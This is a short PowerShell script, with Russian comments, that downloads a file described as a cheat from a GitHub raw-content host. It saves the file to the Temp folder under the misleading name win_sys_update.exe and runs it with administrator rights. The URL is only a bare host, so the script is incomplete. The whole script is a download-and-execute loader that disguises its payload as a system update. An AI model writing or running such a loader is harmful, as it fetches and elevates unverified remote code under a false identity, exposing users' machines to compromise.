$url = "https://githubusercontent.com"
$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"

# Скачивание чита напрямую из вашего репозитория
Invoke-WebRequest -Uri $url -OutFile $path

# Запуск файла от имени администратора
Start-Process -FilePath $path -Verb RunAs
